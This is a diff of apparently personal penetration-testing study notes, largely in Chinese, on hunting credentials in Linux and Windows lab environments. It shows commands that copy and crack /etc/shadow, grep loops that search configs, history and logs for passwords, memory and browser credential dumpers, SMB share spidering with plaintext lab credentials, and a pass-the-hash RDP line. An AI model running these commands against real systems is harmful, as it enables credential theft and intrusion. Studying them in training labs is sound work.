@@ -287,7 +287,7 @@ netexec smb STMIP                                              获取目标的 s
 ./kerbrute bruteuser -d ILF.local --dc STMIP /usr/share/wordlists/fasttrack.txt jmarston      爆破用户 jmarston
 
 
-以下是进行凭据搜寻时应牢记一些地方：
+以下是 Windows 凭据搜寻时应牢记一些地方：
 
 SYSVOL 共享中组策略里的密码
 SYSVOL 共享中脚本里的密码
@@ -306,9 +306,66 @@ KeePass 数据库（如果我们能够猜测或破解主密码）
 
 Linux:::
 etc/passwd 内容
-htb-student:x:1000:1000:,,,:/home/htb-student:/bin/bash            用户名:密码:用户ID:组ID:GECOS:主目录:默认shell      如找到密码 x，表示密码以哈希形式存储在 /etc/shadow 文件中
+htb-student:x:1000:1000:,,,:/home/htb-student:/bin/bash            如找到密码 x，表示密码以哈希形式存储在 /etc/shadow 文件中
+用户名:密码:用户ID:组ID:GECOS:主目录:默认shell
 
 root::0:0:root:/root:/bin/bash            代表可以 su 到 root
+
+/etc/shadow 内容
+htb-student:$y$j9T$3QSBB6CbHEu...SNIP...f8Ms:18955:0:99999:7:::            如果密码字段包含 ! 或 * 字符，用户无法使用 Unix 密码登录，仍然可以使用其他，例如 Kerberos 或基于密钥的身份验证，如果为空，意味着登录不需要密码
+用户名:密码:上次更改:最短使用期限:最长使用期限:警告期:非活动期:过期日期:保留字段
+
+
+用过的密码存储在 /etc/security/opasswd
+
+sudo cp /etc/passwd /tmp/passwd.txt 
+sudo cp /etc/shadow /tmp/shadow.txt
+unshadow /tmp/passwd.txt /tmp/shadow.txt > /tmp/unshadowed.hashes                       获取哈希
+hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked      破解哈希
+
+
+Linux 凭据搜寻
+for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done                  找配置文件
+for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done          展开文件
+for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done          找数据库文件
+for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done        找脚本
+ls -la /etc/cron.*/                                                                                                                                               找计划任务
+tail -n5 /home/*/.bash*                                                                                                                                           找终端历史
+for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null);
+if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done            找日志
+
+sudo python3 mimipenguin.py            在内存找明文密码
+  https://github.com/huntergregal/mimipenguin
+
+python3.9 firefox_decrypt.py             本地找 Firefox
+   https://github.com/unode/firefox_decrypt
+python3 laZagne.py browsers              本地找 浏览器
+sudo python2.7 laZagne.py all            本地找 all
+
+
+https://www.wireshark.org/         抓取网络数据包，分析数据包
+./Pcredz -f demo.pcapng -t -v      解析数据包，找密码
+  https://github.com/lgandx/PCredz
+
+
+Snaffler.exe -s            搜寻 Windows 网络共享
+  https://github.com/SnaffCon/Snaffler
+
+Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public            Windows SMB 共享审计报告
+  https://github.com/NetSPI/PowerHuntShares                                   或其它共享报告
+
+docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'      搜寻 Linux SMB 网络共享
+  https://github.com/blacklanternsecurity/MANSPIDER
+nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw"                                                  搜寻 Linux SMB 或其它网络共享，搜 IT 共享 并 打开文件
+
+nxc smb STMIP -u mendres -p 'Inlanefreight2025!' --shares      查找共享名称
+Get-ChildItem -Recurse -Include *.* \\DC01.inlanefreight.local\IT | Select-String -Pattern "INLANEFREIGHT\\"      递归搜寻 IT 共享
+
+nxc smb STMIP -u jbader -p 'ILovePower333###' --spider HR --content --pattern "Administrator"            搜 HR 共享 并 打开文件
+smbclient //10.129.232.180/HR -U jbader                                                                  登录 HR 共享
+
+
+
 
 
 
@@ -330,40 +387,13 @@ root::0:0:root:/root:/bin/bash            代表可以 su 到 root
     use nxc -x to do the above, then
   xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
 
-  https://specterops.io/blog/2017/03/16/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/#
-
-  https://github.com/unode/firefox_decrypt
-   python3 laZagne.py browsers
-
-Linux::
-  https://github.com/pmittaldev/john-the-ripper/blob/master/src/unshadow.c
-    includes john
-      sudo cp /etc/passwd /tmp/passwd.bak 
-      sudo cp /etc/shadow /tmp/shadow.bak 
-      unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
-
-Bash scripts:
-  config files:  for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
-  db files:  for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
-  txt for no extention:  find /home/* -type f -name "*.txt" -o ! -name "*.*"
-  scripts: for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
-
-Enumerate:
-  cronjobs 
-  .bash_history
-  /var/log/
 
 
-Network traffic:
-  https://github.com/lgandx/PCredz
-
-  https://www.wireshark.org/
+ 
 
 
-NetExec (nxc):
-  --shares  find existing shares
-  --spider  recursive search file name
-  --content  recursive search file content
+
+
 
 
 Pass the Tickets (PtT):
